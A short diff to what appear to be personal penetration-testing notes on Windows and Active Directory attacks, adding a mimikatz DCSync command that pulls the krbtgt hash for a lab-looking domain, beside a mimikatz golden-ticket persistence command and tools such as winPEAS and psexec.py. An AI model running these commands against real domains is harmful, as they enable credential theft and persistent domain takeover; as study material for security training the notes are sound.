@@ -450,5 +450,7 @@ Always run winPEAS:
                            psexec.py
                            evilwinrm
                            
+                           mimikatz----- lsadump::dcsync  /domain:spooky.local  /user:krbtgt
+                           
                            persistence:
                            kerberos::golden /domian:spooky.local /sid:xxxxxxxxxxxxxxxxxxx  /user:admin /krbtgt:nt-hash /ptt
